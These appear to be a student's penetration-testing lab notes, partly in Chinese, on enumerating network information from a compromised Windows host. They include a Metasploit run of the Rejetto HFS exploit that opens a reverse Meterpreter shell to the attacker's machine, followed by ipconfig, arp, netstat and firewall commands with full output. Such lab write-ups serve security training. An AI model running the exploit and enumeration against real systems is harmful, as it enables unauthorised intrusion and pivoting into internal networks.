---
layout: post
title: "Enumerating Network Information"
date: "2023-06-03"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Windows Local Enumeration
## Enumerating Network Information
What are we looking for?
* Current IP address & network adapter
* Internal networks
* TCP/UDP services running and their respective ports
* Other hosts on the network
* Routing table
* Windows Firewall state

## Demo: Enumerating Network Information

# Windows 本地枚举
## 枚举网络信息
我们要寻找什么？

* 当前 IP 地址和网络适配器
* 内部网络
* 运行的 TCP/UDP 服务及其相应的端口
* 网络上的其他主机
* 路由表
* Windows 防火墙状态

## 演示：枚举网络信息
But we want to learn more about the network configuration, as well as the network adapter, and information like the gateway of that particular adapter. So we are trying to identify what IP address on the network is fulfilling the role of the gateway.

We also want to identify any internal networks that we couldn't access publicly. So we want to know whether this system is part of an internal network that we can then scan for to identify other hosts on that network that we can pivot to.

All of this information is important for various reasons. More specifically, it's important during the pivoting phase of post exploitation in that we are trying to identify whether the most important pieces of information that we're trying to identify are internal networks or whether we can identify other hosts that are part of that network that we can pivot to. And in the case of Windows Firewall, that can give us an idea of what we can and cannot do in regards to targeting specific ports. This is also incredibly important especially during the pivoting phase. So enumeration is setting up the stage for the other phases of post exploitation.

Target IP Address: 10.2.20.137

```
msfconsole
search rejetto
use 0
set RHOSTS 10.2.20.137
exploit
```

Now that we've obtained a Meterpreter session, we can open up a command shell session.

```
meterpreter > shell
```

The first piece of information is going to be our current IP address and information pertinent to the network adapter or the network interface card that's been configured on the target system.

```
ipconfig
```

`ipconfig` will tell us the current adapters connected to this system.

The Subnet Mask, which gives us an idea of the network range and the maximum amount of hosts that can be on this particular subnet.

We have the Default Gateway. The gateway is the system or the router that's responsible for routing all the traffic to the various hosts or devices that are on this particular subnet.

We can get addtional information regarding the current adapters.

```
ipconfig /all
```

We get the Mac address which can be used for if you're performing network pentesting attacks that involve a Mac address or trying to spoof a Mac address.

We can see that DHCP is enabled, which means that on this network, IP addresses are assigned automatically by the gateway or the device responsible for that. So if there is a DHCP server, then it's responsible for assigning IP addresses. This is very important, because it tells us that hosts or devices on this network do not have static IPs and are likely to change.

In the case of DHCP, it tells us when the Lease was obtained and when it expires. Whenever you connect to a DHCP-enabled network, you're provided with a Lease for a specific IP address. What's happened is the DHCP server has told this device that you obatained the Lease on the following date. It'll then expire on the following date. At that point, you will either be assigned another IP address on the network or or the subnet, or you can continue using this one if there aren't any confilicts.

The DHCP Server and the gateway are the same, which is very common in small networks.

DNS Servers, which is very important. That tells you what the DNS server this system is utilizing for requests or DNS lookups.

NetBIOS over Tcpip is set to enabled, which in this case is pertinent to Windows and how NetBIOS is configured.

If this particular system was connected to another network or was part of an internal network that we could not access publicly, we would be able to get that adapter information. And we could, in the case of pivoting, we could add that route so that we could gain access or scan that internal network through the system that we've just exploited as it is part of that network.

That is how to display the current adapter information or the network interface card information. All of this information is really important during pivoting.

We can also display the routing table.

```
route print
```

This will tell us whether we have any other active routes that might be interesting.

If I wanted to discover other devices on the network, which is very important. For example, if I exploited this system, which we have, and if I wanted to see what other systems are available on this network.

```
arp -a
```

That'll display the arp table, which has a list of all devices on the network.

In this case, it has the address, as well as the Mac address, of the default gateway, which is responsible in this case for DHCP, as well.

This would give us an idea of what other devices are on this particular subnet here. This information will come in handy during the pivoting phase of post exploitation.

If we wanted to display a list of open connections or the services that are currently running and the ports that they're running on the target system.

```
netstat -ano
```

This will display a list of services that are currently running or listening.

The way the information is sorted is you have your protocol, the local address, the foreign address, if a connection has been established, the state, and the process id.

This is very important because right over here starting off with these ones, these are the services that are running on the target. So you can see there have been binded to the target system's IP address and can be accessed from the localhost or the system's external IP address or public IP address, for that matter. This will pretty much give us the services that we would have identified with Nmap.

In your case, you'll be able to identify a service that's currently connected to port 4444. That the foreign address. This is the system that is connecting to this particular port on the target system. Why am I pointing this out? This is our meterpreter session. The connection or the state is established. and the process id of this connection is 2540. This is the listener or the reverse shell handler of our Kali Linux system, because this is a reverse shell, the target system has connected to our Kali Linux reverse handler on port 4444. And the state is established.

This will give you a good idea of what services are currently running as well as established sessions. It gives you an idea of what's running, as well as what network sessions may have been established.

This is just display the services that are currently binded to the target IP address. And at the bottom, you have the UDP ports. And right at the bottom, for the case of UDP, we also have the IPv6 address sepcified here.

This gives you a good idea of what's running in regards to network services as well as their protocols. And it also displays important information like established network sessions, or the ports being utilized by specific services or protocols.

The final piece of information that is very important is the Windows Firewall configuration and state.

Let's start off by enumerating the firewall state.

```
netsh firewall show state
```

```
netsh advfirewall
```

```
netsh advfirewall firewall
```

```
netsh advfirewall firewall help
```

```
netsh advfirewall firewall dump
```

If we want to display the state.

```
netsh advfirewall show allprofiles
```

```
netsh advfirewall
```

That can be very useful in trying to identify whether specific ports have been blocked. And all of this information is useful if you're trying to utilize a specific port or you're trying to set up a listener, etc.

# Enumerating Network Information（枚举网络信息）
## Overview（概述）
Goal

This lab covers the process of enumerating network information from a Windows target.

目标

本实验涵盖从 Windows 目标枚举网络信息的过程。

## 复现视频内容
Target IP Address : 10.0.19.45

Kali Linux : 10.10.21.3

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


msf5 > use 0
msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.0.19.45
RHOSTS => 10.0.19.45
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.21.3:4444 
[*] Using URL: http://0.0.0.0:8080/36ntYIb1GPmr5
[*] Local IP: http://10.10.21.3:8080/36ntYIb1GPmr5
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /36ntYIb1GPmr5
[*] Sending stage (180291 bytes) to 10.0.19.45
[*] Meterpreter session 1 opened (10.10.21.3:4444 -> 10.0.19.45:49290) at 2023-06-03 07:31:02 +0530
[!] Tried to delete %TEMP%\gyEyh.vbs, unknown result
[*] Server stopped.

meterpreter > 
```

```
meterpreter > shell
Process 2612 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\hfs>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::75d2:5be4:9a89:c5f4%12
   IPv4 Address. . . . . . . . . . . : 10.0.19.45
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.0.16.1

Tunnel adapter isatap.ap-southeast-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal

```

```
C:\hfs>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WIN-OMCNBKR66MN
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : ap-southeast-1.ec2-utilities.amazonaws.com
                                       us-east-1.ec2-utilities.amazonaws.com
                                       ap-southeast-1.compute.internal

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 06-4A-89-35-ED-FC
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::75d2:5be4:9a89:c5f4%12(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.0.19.45(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Lease Obtained. . . . . . . . . . : Saturday, June 3, 2023 1:54:52 AM
   Lease Expires . . . . . . . . . . : Saturday, June 3, 2023 2:54:52 AM
   Default Gateway . . . . . . . . . : 10.0.16.1
   DHCP Server . . . . . . . . . . . : 10.0.16.1
   DHCPv6 IAID . . . . . . . . . . . : 319697556
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-EB-A5-6A-06-4E-FA-4C-65-EA
   DNS Servers . . . . . . . . . . . : 10.0.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.ap-southeast-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

```
C:\hfs>route print
route print
===========================================================================
Interface List
 12...06 4a 89 35 ed fc ......AWS PV Network Device #0
  1...........................Software Loopback Interface 1
 14...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0        10.0.16.1       10.0.19.45     10
        10.0.16.0    255.255.240.0         On-link        10.0.19.45    266
       10.0.19.45  255.255.255.255         On-link        10.0.19.45    266
      10.0.31.255  255.255.255.255         On-link        10.0.19.45    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
  169.254.169.123  255.255.255.255        10.0.16.1       10.0.19.45     10
  169.254.169.249  255.255.255.255        10.0.16.1       10.0.19.45     10
  169.254.169.250  255.255.255.255        10.0.16.1       10.0.19.45     10
  169.254.169.251  255.255.255.255        10.0.16.1       10.0.19.45     10
  169.254.169.253  255.255.255.255        10.0.16.1       10.0.19.45     10
  169.254.169.254  255.255.255.255        10.0.16.1       10.0.19.45     10
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link        10.0.19.45    266
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
  255.255.255.255  255.255.255.255         On-link        10.0.19.45    266
===========================================================================
Persistent Routes:
  None

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    306 ::1/128                  On-link
 12    266 fe80::/64                On-link
 12    266 fe80::75d2:5be4:9a89:c5f4/128
                                    On-link
  1    306 ff00::/8                 On-link
 12    266 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```

```
C:\hfs>arp -a
arp -a

Interface: 10.0.19.45 --- 0xc
  Internet Address      Physical Address      Type
  10.0.16.1             06-73-41-c8-ca-42     dynamic   
  10.0.24.47            06-6d-76-fa-cd-9e     dynamic   
  10.0.24.176           06-20-14-ab-88-8c     dynamic   
  10.0.31.103           06-4d-7a-33-38-c2     dynamic   
  10.0.31.255           ff-ff-ff-ff-ff-ff     static    
  169.254.169.254       06-73-41-c8-ca-42     dynamic   
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

```
C:\hfs>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2064
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       752
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1940
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       572
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       864
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1052
  TCP    0.0.0.0:49164          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49177          0.0.0.0:0              LISTENING       668
  TCP    10.0.19.45:139         0.0.0.0:0              LISTENING       4
  TCP    10.0.19.45:49174       10.0.31.103:443        ESTABLISHED     1088
  TCP    10.0.19.45:49290       10.10.21.3:4444        ESTABLISHED     1588
  TCP    10.0.19.45:49642       10.0.24.176:443        TIME_WAIT       0
  TCP    10.0.19.45:49665       169.254.169.254:80     CLOSE_WAIT      1264
  TCP    10.0.19.45:49667       10.0.24.47:443         ESTABLISHED     1088
  TCP    127.0.0.1:80           127.0.0.1:49659        ESTABLISHED     2064
  TCP    127.0.0.1:80           127.0.0.1:49664        ESTABLISHED     2064
  TCP    127.0.0.1:80           127.0.0.1:49666        ESTABLISHED     2064
  TCP    127.0.0.1:49659        127.0.0.1:80           ESTABLISHED     2616
  TCP    127.0.0.1:49664        127.0.0.1:80           ESTABLISHED     2616
  TCP    127.0.0.1:49666        127.0.0.1:80           ESTABLISHED     2616
  TCP    [::]:135               [::]:0                 LISTENING       752
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       1940
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       572
  TCP    [::]:49153             [::]:0                 LISTENING       864
  TCP    [::]:49154             [::]:0                 LISTENING       916
  TCP    [::]:49155             [::]:0                 LISTENING       1052
  TCP    [::]:49164             [::]:0                 LISTENING       660
  TCP    [::]:49177             [::]:0                 LISTENING       668
  UDP    0.0.0.0:500            *:*                                    916
  UDP    0.0.0.0:3389           *:*                                    1940
  UDP    0.0.0.0:4500           *:*                                    916
  UDP    0.0.0.0:5355           *:*                                    444
  UDP    10.0.19.45:137         *:*                                    4
  UDP    10.0.19.45:138         *:*                                    4
  UDP    [::]:500               *:*                                    916
  UDP    [::]:3389              *:*                                    1940
  UDP    [::]:4500              *:*                                    916
  UDP    [::]:5355              *:*                                    444
```

```
C:\hfs>netsh firewall show state
netsh firewall show state

IMPORTANT: "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .

The RPC server is unavailable.
```

```
C:\hfs>netsh advfirewall
netsh advfirewall

The following commands are available:

Commands in this context:
?              - Displays a list of commands.
consec         - Changes to the `netsh advfirewall consec' context.
dump           - Displays a configuration script.
export         - Exports the current policy to a file.
firewall       - Changes to the `netsh advfirewall firewall' context.
help           - Displays a list of commands.
import         - Imports a policy file into the current policy store.
mainmode       - Changes to the `netsh advfirewall mainmode' context.
monitor        - Changes to the `netsh advfirewall monitor' context.
reset          - Resets the policy to the default out-of-box policy.
set            - Sets the per-profile or global settings.
show           - Displays profile or global properties.

The following sub-contexts are available:
 consec firewall mainmode monitor

To view help for a command, type the command, followed by a space, and then
 type ?.
```

```
C:\hfs>netsh advfirewall firewall
netsh advfirewall firewall

The following commands are available:

Commands in this context:
?              - Displays a list of commands.
add            - Adds a new inbound or outbound firewall rule.
delete         - Deletes all matching firewall rules.
dump           - Displays a configuration script.
help           - Displays a list of commands.
set            - Sets new values for properties of a existing rule.
show           - Displays a specified firewall rule.

To view help for a command, type the command, followed by a space, and then
 type ?.
```

```
C:\hfs>netsh advfirewall firewall help
netsh advfirewall firewall help

The following commands are available:

Commands in this context:
?              - Displays a list of commands.
add            - Adds a new inbound or outbound firewall rule.
delete         - Deletes all matching firewall rules.
dump           - Displays a configuration script.
help           - Displays a list of commands.
set            - Sets new values for properties of a existing rule.
show           - Displays a specified firewall rule.

To view help for a command, type the command, followed by a space, and then
 type ?.
```

```
C:\hfs>netsh advfirewall firewall dump
netsh advfirewall firewall dump

```

```
C:\hfs>netsh advfirewall show
netsh advfirewall show

The following commands are available:

Commands in this context:
show allprofiles - Displays properties for all profiles.
show currentprofile - Displays properties for the active profile.
show domainprofile - Displays properties for the domain properties.
show global    - Displays the global properties.
show privateprofile - Displays properties for the private profile.
show publicprofile - Displays properties for the public profile.
show store     - Displays the policy store for the current interactive session.
```

```
C:\hfs>netsh advfirewall show allprofiles
netsh advfirewall show allprofiles

An error occurred while attempting to contact the  Windows Firewall service. Make sure that the service is running and try your request again.
```